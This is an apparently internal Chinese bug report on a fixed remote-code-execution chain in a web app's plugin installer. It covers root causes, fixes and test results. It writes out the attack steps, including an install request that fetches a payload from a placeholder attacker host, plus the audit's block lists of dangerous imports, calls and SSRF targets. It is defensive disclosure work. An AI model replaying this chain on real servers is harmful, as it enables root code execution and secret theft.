# 临时邮箱 Provider 插件安装链远程代码执行缺陷 (BUG)

**创建日期**: 2026-10-25
**缺陷等级**: P0（未授权登录态即可远程代码执行）
**影响版本**: v2.9.10 / v2.9.11（`ea531a1` 及之前）
**状态**: 已修复

## 概述

临时邮箱 Provider 插件的安装接口 `POST /api/plugins/install` 与插件热刷新接口
`POST /api/system/reload-plugins` 组合，构成一条完整的远程代码执行链。攻击者只需持有
后台登录态（`session["logged_in"]`，无管理员角色校验），即可让服务端从任意地址下载
Python 文件并以进程身份执行，在生产容器内以 `uid=0(root)` 运行任意命令。

## 缺陷根因

四处设计缺口叠加成链：

| # | 位置 | 问题 |
|---|------|------|
| 1 | `controllers/plugins.py` → `install_plugin(name, url=url)` | HTTP 接口直接把请求体 `url` 透传给服务端下载器，下载源完全由客户端决定 |
| 2 | `services/temp_mail_plugin_manager.py` | 完整性校验条件是 `if url is None and entry is not None`，自定义 URL 时 `entry` 恒为 `None`，sha256 分支整段失效 |
| 3 | 同上 | `target = plugin_dir / f"{plugin_name}.py"`，`name` 无白名单，可含路径分隔符实现目录穿越写入 |
| 4 | `services/temp_mail_provider_factory.py` | `spec.loader.exec_module(mod)` 无条件加载插件目录内任意 `.py`，模块顶层代码在执行期即生效，无静态审计、无签名、无沙箱 |

另有一处放大面：`requests.get(download_url)` 未限制协议与目标地址，可访问回环、内网与云元数据端点。

## 攻击链

```
携带登录态 POST /api/plugins/install
  {"name": "<任意>", "url": "http://攻击者/载荷.py"}
    → install_plugin()：entry = None
    → requests.get(url)            任意源下载，无协议/域名限制
    → 完整性校验条件恒假             sha256 跳过
    → target.write_bytes()         写入 plugins/temp_mail_providers/<name>.py
POST /api/system/reload-plugins
    → load_plugins() → exec_module()   模块顶层代码执行，uid=0
```

`reload_plugins()` 在加载前会清空 `_FAILED_PLUGIN_MTIMES` 中不存在的条目，因此「改名即可
绕过失败节流」，重放稳定。

## 影响

- 容器内以 root 执行任意命令（容器内进程用户即 root）
- 可读取 `SECRET_KEY`、数据库内加密字段（外部 API Key、CF Worker 管理密钥等）
- 可写 Web 根目录，形成持久化与匿名访问通道
- 插件在每次 reload 与进程重启时被重新加载，重启不清除

## 修复方案

遵循「保留能力、收敛边界」原则：自定义来源安装是上游既有特性（CLI `--from` 与
文档中的自定义安装），不做删除，改为分层设防。

### 1. 接口层：关闭自定义 URL 通道

`controllers/plugins.py` 拒绝请求体中的 `url`，安装源只能是服务端登记的官方插件源。
自定义来源安装收敛到命令行工具，需在服务器上显式执行。

### 2. 下载层：地址白名单

`_check_download_url()` 仅允许 `http`/`https`；自定义来源额外拒绝回环、私网、
链路本地、保留地址与云元数据主机名（`169.254.169.254`、`metadata.google.internal` 等），
域名先做 DNS 解析再逐地址判定。

### 3. 名称与路径层：杜绝穿越

`_validate_plugin_name()` 限定 `^[A-Za-z0-9_][A-Za-z0-9_.-]{0,63}$` 且拒绝 `..`；
`_resolve_plugin_target()` 用 `resolve()` 复核落点父目录必须等于插件目录。

### 4. 内容层：源码静态审计

`_audit_plugin_source()` 用 `ast` 解析后拒绝：

- 导入 `subprocess` / `ctypes` / `pty` / `multiprocessing` / `socket` / `pickle` / `marshal`
- 调用 `eval` / `exec` / `compile` / `__import__` / `system` / `popen` / `execv` / `spawnl` / `exec_module`
- 非 UTF-8、语法错误、未继承 `TempMailProviderBase` 或未使用 `@register_provider`

同时调整完整性语义：官方源声明了 `sha256` 就必须匹配；未声明时同样走源码审计，
消除「源里没写 sha256 即完全不校验」的口子。

### 5. 加载层：拒绝符号链接

`load_plugins()` 对插件目录内的符号链接直接标记 `failed`，避免把目录外文件带进进程。

## 验证

修复前在生产实例（Debian 12 / Python 3.11 / `uid=0`）上确认：

```
POST /api/plugins/install {"name":"poc_probe","url":"http://<attacker>/poc_probe.py"}  → 200，文件落盘
POST /api/system/reload-plugins  → loaded 含攻击者模块，容器内执行成功
```

修复后同一实例：

```
POST /api/plugins/install {"name":"pwn9","url":"http://<any>/poc_probe.py"}  → 400 PLUGIN_CUSTOM_URL_DISABLED
插件目录保持为空，无文件写入
POST /api/system/reload-plugins → {"loaded":[],"failed":[]}
```

纵深防线单独校验：

```
subprocess RCE          → BLOCKED PLUGIN_SOURCE_REJECTED
__import__ os.system    → BLOCKED PLUGIN_SOURCE_REJECTED
合法 provider            → ACCEPTED
http://127.0.0.1/x.py   → BLOCKED PLUGIN_URL_BLOCKED
http://169.254.169.254/ → BLOCKED PLUGIN_URL_BLOCKED
file:///etc/passwd      → BLOCKED PLUGIN_URL_INVALID
https://example.com/... → ALLOWED
```

## 回归

- 插件相关测试 106 项全绿
- 全仓测试 886 项通过；`tests/test_pool_cf_real_e2e.py` 4 项失败为既有问题（依赖外部 CF Worker，改动前后一致）
- 正常业务流程：插件列表、热刷新、官方源安装（未登记插件返回 `PLUGIN_NOT_FOUND`）、登录与鉴权均正常

## 后续建议

1. **接口鉴权分层**：`/api/plugins/*` 与 `/api/system/reload-plugins` 目前只有
   `@login_required`，建议增加管理员角色校验，降低单账号泄露的影响面。
2. **插件签名**：为官方插件源引入离线签名（Ed25519），以公钥内置的方式替代纯 sha256。
3. **容器降权**：应用进程改以非 root 用户运行，插件目录与 Web 根目录设为只读挂载。
4. **沙箱化**：如需长期支持第三方插件，考虑在独立进程或受限解释器中加载。

## 变更文件

- `outlook_web/controllers/plugins.py`
- `outlook_web/services/temp_mail_plugin_manager.py`
- `outlook_web/services/temp_mail_provider_factory.py`
- `outlook_web/services/temp_mail_plugin_cli.py`
- `tests/test_temp_mail_plugin_manager.py`
- `tests/test_temp_mail_plugin_cli.py`
